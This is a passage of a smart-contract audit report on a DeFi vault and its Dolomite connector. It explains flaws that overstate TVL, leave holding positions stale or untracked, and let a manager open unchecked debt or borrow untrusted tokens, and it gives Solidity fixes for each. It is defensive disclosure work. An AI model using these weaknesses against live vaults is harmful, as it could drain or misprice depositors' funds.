When the vault holds debt positions in connectors and transfers `baseToken` (such as borrowed funds or withdrawn liquidity) to `AccountingManager`—or when connector asset values drop below `totalDebt` while idle `baseToken` remains in `AccountingManager`—`totalTVL` in `TVLHelper.getTVL()` becomes smaller than `totalDebt`. Because `TVLHelper.getTVL()` clamps its return value to `0` whenever `totalTVL < totalDebt`, the unpaid net debt (`totalDebt - totalTVL`) is discarded before `AccountingManager.TVL()` adds `baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit`.

Consequently, `AccountingManager.TVL()` fails to deduct the net connector debt (`totalDebt - totalTVL`) from the vault's idle `baseToken` balance. This overstates `TVL()`, which directly inflates `totalAssets()` (line 592), ERC4626 share conversions (`previewRedeem` used in `calculateWithdrawShares` at line 344), and vault profit calculations in `getProfit()` (line 583).

findings.remediation:
Account for the vault's idle `baseToken` balance (`baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit`) before deducting `totalDebt` and clamping at zero, or have the helper return both connector assets and connector debt so `AccountingManager.TVL()` can deduct `totalDebt` from the combined vault assets.

```solidity
    function TVL() public view returns (uint256) {
        uint256 totalTVL = baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit;
        uint256 totalDebt;
        HoldingPI[] memory positions = registry.getHoldingPositions(vaultId);
        for (uint256 i = 0; i < positions.length; i++) {
            if (positions[i].calculatorConnector == address(0)) {
                continue;
            }
            uint256 tvl = IConnector(positions[i].calculatorConnector).getPositionTVL(positions[i], address(baseToken));
            if (registry.isPositionDebt(vaultId, positions[i].positionId)) {
                totalDebt += tvl;
            } else {
                totalTVL += tvl;
            }
        }
        if (totalTVL <= totalDebt) {
            return 0;
        }
        return totalTVL - totalDebt;
    }
```

Ensure that `AccountingManager`'s idle `baseToken` balance is accounted for in exactly one place (either exclusively via `AccountingManager.TVL()` while `AccountingManager.getPositionTVL()` returns `0`, or exclusively inside `TVLHelper.getTVL()` via the `AccountingManager` holding position without adding it a second time in `AccountingManager.TVL()`).

If `TVLHelper.getTVL` already accounts for `AccountingManager`'s holding position, update `AccountingManager.TVL()` to:

```solidity
    function TVL() public view returns (uint256) {
        return TVLHelper.getTVL(vaultId, registry, address(baseToken));
    }
```

Track the connector's accounted token balance explicitly (for example, by storing and updating the tracked token amount in `position.additionalData` or an internal accounting mapping on the connector that excludes unsolicited transfers and tokens already allocated to other positions) and prevent `AccountingManager` from double-counting balances already accounted for in `TVL()` or connector-specific positions.

Within `AccountingManager.getPositionTVL`, read the accounted token amount (or cap the balance against the tracked amount recorded in `position.additionalData` and exclude `address(this)` when `token == address(baseToken)`):

```solidity
    function getPositionTVL(HoldingPI memory position, address base) public view returns (uint256) {
        PositionBP memory p = registry.getPositionBP(vaultId, position.positionId);
        if (p.positionTypeId == 0) {
            address token = abi.decode(p.data, (address));
            address holder = abi.decode(position.data, (address));
            if (holder == address(this) && token == address(baseToken)) {
                return 0;
            }
            uint256 trackedAmount = position.additionalData.length >= 32
                ? abi.decode(position.additionalData, (uint256))
                : 0;
            uint256 balance = IERC20(token).balanceOf(holder);
            uint256 amount = trackedAmount < balance ? trackedAmount : balance;
            return _getValue(token, base, amount);
        }
        return 0;
    }
```

In `PositionRegistry.updateHoldingPosition`, use `ownerConnector` instead of `calculatorConnector` when updating `vault.isPositionUsed` for the swapped holding position:

```solidity
        if (removePosition) {
            if (positionIndex < vault.holdingPositions.length - 1) {
                vault.holdingPositions[positionIndex] = vault.holdingPositions[vault.holdingPositions.length - 1];
                vault.isPositionUsed[keccak256(
                    abi.encode(
                        vault.holdingPositions[positionIndex].ownerConnector,
                        vault.holdingPositions[positionIndex].positionId,
                        vault.holdingPositions[positionIndex].data
                    )
                )] = positionIndex;
            }
            vault.holdingPositions.pop();
            vault.isPositionUsed[holdingPositionId] = 0;
            emit HoldingPositionUpdated(vaultId, _positionId, _data, additionalData, removePosition, positionIndex);
            return type(uint256).max;
        }
```

findings.technical_details:
In `DolomiteConnector`, positions held in Dolomite are tracked in `PositionRegistry` per Dolomite account number (`abi.encode(accountId)`). The connector's `_getPositionTVL` function decodes `accountId` from `HoldingPI.data` and queries `dolomiteMargin.getAccountBalances(Info(address(this), accountId))` to value all supplied collateral and debt in that account.

For the default account (`accountId = 0`), `DolomiteConnector` manages the holding position lifecycle exclusively in `deposit` (lines 38–40) and `withdraw` (lines 50–55):

1. In `deposit` (lines 38–40), the connector registers `abi.encode(0)` as an active holding position:
   ```solidity
   registry.updateHoldingPosition(
       vaultId, registry.calculatePositionId(address(this), DOL_POSITION_ID, ""), abi.encode(0), "", false
   );
   ```
2. In `withdraw` (lines 50–55), the connector queries the remaining markets in default account `0` and removes the `abi.encode(0)` holding position if `markets.length == 0`:
   ```solidity
   (uint256[] memory markets,,,) = dolomiteMargin.getAccountBalances(Info(address(this), 0));
   if (markets.length == 0) {
       registry.updateHoldingPosition(
           vaultId, registry.calculatePositionId(address(this), DOL_POSITION_ID, ""), abi.encode(0), "", true
       );
   }
   ```

However, default account `0` is also the source and destination account for isolated borrow positions in `openBorrowPosition`, `transferBetweenAccounts`, and `closeBorrowPosition`:
- When the manager deposits collateral into account `0`, moves part of the collateral to a borrow account `accountId` via `openBorrowPosition` or `transferBetweenAccounts`, and then withdraws the remaining balance from account `0` via `withdraw`, `dolomiteMargin.getAccountBalances(Info(address(this), 0))` returns `markets.length == 0` at line 50. Consequently, `withdraw` (lines 51–55) removes the `abi.encode(0)` holding position from `PositionRegistry`.
- When the borrow position in `accountId` is later closed via `closeBorrowPosition(marketIds, accountId)` (which executes `borrowPositionProxy.closeBorrowPosition(accountId, 0, marketIds)` to transfer all remaining collateral back to account `0` and removes `abi.encode(accountId)` from the registry) or when assets are transferred back to account `0` via `transferBetweenAccounts` (`borrowOrRepay = true`), the `abi.encode(0)` holding position is not re-added because `abi.encode(0)` is only registered in `deposit` (lines 38–40). As a result, all collateral returned to default account `0` is untracked in `PositionRegistry` and excluded from `accountingManager.TVL()`.
- Conversely, if all assets in account `0` are transferred to `accountId` via `openBorrowPosition` or `transferBetweenAccounts` (`borrowOrRepay = false`) without calling `withdraw`, `markets.length` for account `0` becomes `0`, but the `abi.encode(0)` holding position added in `deposit` (lines 38–40) remains in `vault.holdingPositions` as an empty position, consuming a slot against `maxNumHoldingPositions` and preventing `removeTrustedPosition`.

findings.remediation:
Extract the default account (`accountId = 0`) holding position synchronization in `deposit` and `withdraw` into an internal helper function `_updateDefaultAccountHoldingPosition()` that checks `dolomiteMargin.getAccountBalances(Info(address(this), 0))` and adds `abi.encode(0)` when `markets.length > 0` or removes it when `markets.length == 0`, and invoke this helper whenever default account `0` balances are updated.

```solidity
    function deposit(uint256 marketId, uint256 _amount) public onlyManager nonReentrant {
        // get market token
        address token = dolomiteMargin.getMarketTokenAddress(marketId);
        // approve
        _approveOperations(token, address(dolomiteMargin), _amount);
        depositWithdrawalProxy.depositWeiIntoDefaultAccount(marketId, _amount);
        // Update token
        _updateTokenInRegistry(token);
        _updateDefaultAccountHoldingPosition();
    }

    function withdraw(uint256 marketId, uint256 _amount) public onlyManager nonReentrant {
        address token = dolomiteMargin.getMarketTokenAddress(marketId);
        depositWithdrawalProxy.withdrawWeiFromDefaultAccount(
            marketId, _amount, AccountBalanceHelper.BalanceCheckFlag.Both
        );
        // Update token
        _updateTokenInRegistry(token);
        _updateDefaultAccountHoldingPosition();
    }

    function _updateDefaultAccountHoldingPosition() internal {
        (uint256[] memory markets,,,) = dolomiteMargin.getAccountBalances(Info(address(this), 0));
        registry.updateHoldingPosition(
            vaultId,
            registry.calculatePositionId(address(this), DOL_POSITION_ID, ""),
            abi.encode(0),
            "",
            markets.length == 0
        );
    }
```

findings.technical_details:
In Dolomite Margin, accounts can hold both positive (supplied collateral) and negative (borrowed debt) balances across markets. When withdrawing assets via `IDepositWithdrawalProxy.withdrawWeiFromDefaultAccount(uint256 _marketId, uint256 _amountWei, AccountBalanceHelper.BalanceCheckFlag _balanceCheckFlag)`, the `_balanceCheckFlag` parameter controls whether Dolomite verifies that the source account (`_fromAccountNumber = 0`) retains a non-negative balance in `_marketId` after the withdrawal settles.

As documented in `IDepositWithdrawalProxy.sol`:
> `@param _balanceCheckFlag Use BalanceCheckFlag.Both or BalanceCheckFlag.From to check that _fromAccountNumber balance is non-negative after the withdrawal settles.`

In `DolomiteConnector.sol`, `withdraw` is implemented at lines 43–56:
```solidity
function withdraw(uint256 marketId, uint256 _amount) public onlyManager nonReentrant {
    address token = dolomiteMargin.getMarketTokenAddress(marketId);
    depositWithdrawalProxy.withdrawWeiFromDefaultAccount(
        marketId, _amount, AccountBalanceHelper.BalanceCheckFlag.None
    );
    // Update token
    _updateTokenInRegistry(token);
    (uint256[] memory markets,,,) = dolomiteMargin.getAccountBalances(Info(address(this), 0));
    if (markets.length == 0) {
        registry.updateHoldingPosition(
            vaultId, registry.calculatePositionId(address(this), DOL_POSITION_ID, ""), abi.encode(0), "", true
        );
    }
}
```

Because `AccountBalanceHelper.BalanceCheckFlag.None` is passed at line 46:
1. **Implicit Debt Creation in Default Account (Account 0):** If `_amount` exceeds the connector's supplied balance in `marketId` for account 0 (and account 0 has sufficient collateral in other markets to satisfy Dolomite's margin requirements), the withdrawal does not revert. Instead, Dolomite drives the account 0 balance for `marketId` negative, effectively opening a margin loan directly inside the default account without enforcing any `minimumHealthFactor` check.
2. **Bypassing Token Trust Validation:** Unlike `openBorrowPosition` and `transferBetweenAccounts`, `withdraw` does not verify `registry.isTokenTrusted(vaultId, token, address(this))` because it assumes only previously deposited tokens can be withdrawn. With `BalanceCheckFlag.None`, a manager can call `withdraw` on any `marketId` supported by Dolomite (even one with zero balance in account 0) to borrow an untrusted token against existing collateral in account 0, which then fails in `_updateTokenInRegistry(token)` only if no trusted position exists for that token, or succeeds if a position exists elsewhere while still creating unauthorized debt in account 0.

findings.remediation:
Pass `AccountBalanceHelper.BalanceCheckFlag.From` (or `AccountBalanceHelper.BalanceCheckFlag.Both`) to `depositWithdrawalProxy.withdrawWeiFromDefaultAccount` in `DolomiteConnector.withdraw` so that Dolomite reverts if the withdrawal would cause the default account's balance in `marketId` to become negative.

```solidity
    function withdraw(uint256 marketId, uint256 _amount) public onlyManager nonReentrant {
        address token = dolomiteMargin.getMarketTokenAddress(marketId);
        depositWithdrawalProxy.withdrawWeiFromDefaultAccount(
            marketId, _amount, AccountBalanceHelper.BalanceCheckFlag.From
        );
        // Update token
        _updateTokenInRegistry(token);
        (uint256[] memory markets,,,) = dolomiteMargin.getAccountBalances(Info(address(this), 0));
        if (markets.length == 0) {
            registry.updateHoldingPosition(
                vaultId, registry.calculatePositionId(address(this), DOL_POSITION_ID, ""), abi.encode(0), "", true
            );
        }
    }
```

Pass `AccountBalanceHelper.BalanceCheckFlag.Both` (or `AccountBalanceHelper.BalanceCheckFlag.From`) when calling `borrowPositionProxy.openBorrowPosition` so that the source account `0` cannot be driven negative, and enforce `minimumHealthFactor` on the affected accounts. Also ensure `updateHoldingPosition` passes `false` for `removePosition` when registering the newly opened borrow position.

```solidity
    function openBorrowPosition(uint256 marketId, uint256 _amountWei, uint256 accountId)
        public
        onlyManager
        nonReentrant
    {
        address token = dolomiteMargin.getMarketTokenAddress(marketId);

        if (!registry.isTokenTrusted(vaultId, token, address(this))) {
            revert IConnector_UntrustedToken(token);
        }
        // borrow
        borrowPositionProxy.openBorrowPosition(
            0, accountId, marketId, _amountWei, AccountBalanceHelper.BalanceCheckFlag.Both
        );
        _checkHealthFactor(0);
        _checkHealthFactor(accountId);
        registry.updateHoldingPosition(
            vaultId, registry.calculatePositionId(address(this), DOL_POSITION_ID, ""), abi.encode(accountId), "", false
        );
    }

    function _checkHealthFactor(uint256 accountId) internal view {
        (Value memory suppliedValue, Value memory borrowedValue) =
            dolomiteMargin.getAdjustedAccountValues(Info(address(this), accountId));
        if (borrowedValue.value > 0) {
            Decimal.D256 memory marginRatio = dolomiteMargin.getMarginRatio();
            uint256 minCollateral =
                (borrowedValue.value * (Decimal.BASE + marginRatio.value) * minimumHealthFactor) / (Decimal.BASE * 1e18);
            if (suppliedValue.value < minCollateral) {
                uint256 hf = (suppliedValue.value * Decimal.BASE * 1e18)
                    / (borrowedValue.value * (Decimal.BASE + marginRatio.value));
                revert IConnector_LowHealthFactor(hf);
            }
        }
    }
```

findings.technical_details:
In `DolomiteConnector`, each Dolomite sub-account is tracked as a separate holding position in `PositionRegistry`, identified by `abi.encode(accountId)` as its position `data`. When assets are deposited via `deposit`, the default account (`accountId = 0`) is registered as an active holding position with `data = abi.encode(0)`:

```solidity
registry.updateHoldingPosition(
    vaultId, registry.calculatePositionId(address(this), DOL_POSITION_ID, ""), abi.encode(0), "", false
);
```

When assets are withdrawn from the default account in `withdraw`, the connector checks whether account `0` still holds any active market balances via `dolomiteMargin.getAccountBalances(Info(address(this), 0))` and removes the holding position for account `0` if `markets.length == 0`:

```solidity
(uint256[] memory markets,,,) = dolomiteMargin.getAccountBalances(Info(address(this), 0));
if (markets.length == 0) {
    registry.updateHoldingPosition(
        vaultId, registry.calculatePositionId(address(this), DOL_POSITION_ID, ""), abi.encode(0), "", true
    );
}
```

However, in `openBorrowPosition` (lines 58–75 of `contracts/connectors/Dolomite.sol`), `borrowPositionProxy.openBorrowPosition(0, accountId, marketId, _amountWei, AccountBalanceHelper.BalanceCheckFlag.None)` sources the collateral directly from default account `0` (`_fromAccountNumber = 0`) and moves it into `accountId`. Even if the entire balance of account `0` is transferred into `accountId` (leaving account `0` with zero balances across all markets), `openBorrowPosition` does not query `dolomiteMargin.getAccountBalances(Info(address(this), 0))` and does not call `registry.updateHoldingPosition(..., abi.encode(0), "", true)` to remove the now-empty default account position.

As a result:
1. A stale holding position for account `0` remains in `vault.holdingPositions`, permanently consuming one of the vault's limited holding position slots (`maxNumHoldingPositions`).
2. `PositionRegistry.removeTrustedPosition` will revert with `CannotRemovePosition` even after all borrow positions are closed, unless a separate deposit and full withdrawal is executed on account `0`.

findings.remediation:
In `DolomiteConnector.openBorrowPosition`, check whether default account `0` has any remaining market balances after opening the borrow position, and remove the holding position for account `0` if `markets.length == 0` (in addition to registering the new `accountId` holding position with `removePosition = false`):

```solidity
    function openBorrowPosition(uint256 marketId, uint256 _amountWei, uint256 accountId)
        public
        onlyManager
        nonReentrant
    {
        address token = dolomiteMargin.getMarketTokenAddress(marketId);

        if (!registry.isTokenTrusted(vaultId, token, address(this))) {
            revert IConnector_UntrustedToken(token);
        }
        // borrow
        borrowPositionProxy.openBorrowPosition(
            0, accountId, marketId, _amountWei, AccountBalanceHelper.BalanceCheckFlag.None
        );
        bytes32 positionId = registry.calculatePositionId(address(this), DOL_POSITION_ID, "");
        registry.updateHoldingPosition(
            vaultId, positionId, abi.encode(accountId), "", false
        );
        (uint256[] memory markets,,,) = dolomiteMargin.getAccountBalances(Info(address(this), 0));
        if (markets.length == 0) {
            registry.updateHoldingPosition(
                vaultId, positionId, abi.encode(0), "", true
            );
        }
    }
```

findings.technical_details:
In `DolomiteConnector`, deposits are placed into Dolomite's default account (`accountId = 0`), which is tracked in `PositionRegistry` with position data `abi.encode(0)` (see `deposit` at lines 38–40). When the vault manager opens an isolated borrow position via `openBorrowPosition(uint256 marketId, uint256 _amountWei, uint256 accountId)`, the connector calls `borrowPositionProxy.openBorrowPosition(0, accountId, marketId, _amountWei, ...)` (lines 69–71), which transfers `_amountWei` of market collateral from account `0` to sub-account `accountId`.

To track the new sub-account's balances in the vault's TVL calculation (`_getPositionTVL`, lines 106–122, which decodes `accountId` from `HoldingPI.data`), `openBorrowPosition` calls `registry.updateHoldingPosition`:

```solidity
registry.updateHoldingPosition(
    vaultId, registry.calculatePositionId(address(this), DOL_POSITION_ID, ""), abi.encode(accountId), "", true
);
```

The fifth parameter of `PositionRegistry.updateHoldingPosition` is `bool removePosition` (`Registry.sol` line 340). Passing `true` instructs the registry to remove the holding position rather than add it. In `PositionRegistry.updateHoldingPosition` (`Registry.sol` lines 345–347):

```solidity
bytes32 holdingPositionId = keccak256(abi.encode(msg.sender, _positionId, _data));
uint256 positionIndex = vault.isPositionUsed[holdingPositionId];
if (positionIndex == 0 && removePosition) return type(uint256).max;
```

Because the newly opened `accountId` position is not yet recorded in `vault.isPositionUsed` (`positionIndex == 0`) and `removePosition` is `true`, `updateHoldingPosition` immediately returns `type(uint256).max` without pushing a `HoldingPI` entry to `vault.holdingPositions`. Furthermore, if `accountId == 0` were ever passed, it would erroneously delete the existing holding position for account `0`.

As a result, the collateral transferred out of account `0` is no longer counted in account `0`'s balances, and `accountId` is missing from `vault.holdingPositions`, so `DolomiteConnector._getPositionTVL` is never invoked for `accountId`.

findings.remediation:
Pass `false` for the `removePosition` argument in `DolomiteConnector.openBorrowPosition` (and also verify whether account `0` has any remaining balances left after transferring collateral out, removing account `0`'s holding position if its markets are empty).

```solidity
    function openBorrowPosition(uint256 marketId, uint256 _amountWei, uint256 accountId)
        public
        onlyManager
        nonReentrant
    {
        address token = dolomiteMargin.getMarketTokenAddress(marketId);

        if (!registry.isTokenTrusted(vaultId, token, address(this))) {
            revert IConnector_UntrustedToken(token);
        }
        // borrow
        borrowPositionProxy.openBorrowPosition(
            0, accountId, marketId, _amountWei, AccountBalanceHelper.BalanceCheckFlag.None
        );
        registry.updateHoldingPosition(
            vaultId, registry.calculatePositionId(address(this), DOL_POSITION_ID, ""), abi.encode(accountId), "", false
        );
        (uint256[] memory markets,,,) = dolomiteMargin.getAccountBalances(Info(address(this), 0));
        if (markets.length == 0) {
            registry.updateHoldingPosition(
                vaultId, registry.calculatePositionId(address(this), DOL_POSITION_ID, ""), abi.encode(0), "", true
            );
        }
    }
```

Pass `AccountBalanceHelper.BalanceCheckFlag.From` (or `AccountBalanceHelper.BalanceCheckFlag.Both`) when transferring from account `0` to `accountId` so that Dolomite reverts if account `0`'s balance would become negative.

```solidity
    function transferBetweenAccounts(uint256 accountId, uint256 marketId, uint256 _amountWei, bool borrowOrRepay)
        public
        onlyManager
        nonReentrant
    {
        address token = dolomiteMargin.getMarketTokenAddress(marketId);

        if (!registry.isTokenTrusted(vaultId, token, address(this))) {
            revert IConnector_UntrustedToken(token);
        }
        if (borrowOrRepay) {
            borrowPositionProxy.transferBetweenAccounts(
                accountId, 0, marketId, _amountWei, AccountBalanceHelper.BalanceCheckFlag.To
            );
        } else {
            borrowPositionProxy.transferBetweenAccounts(
                0, accountId, marketId, _amountWei, AccountBalanceHelper.BalanceCheckFlag.From
            );
        }
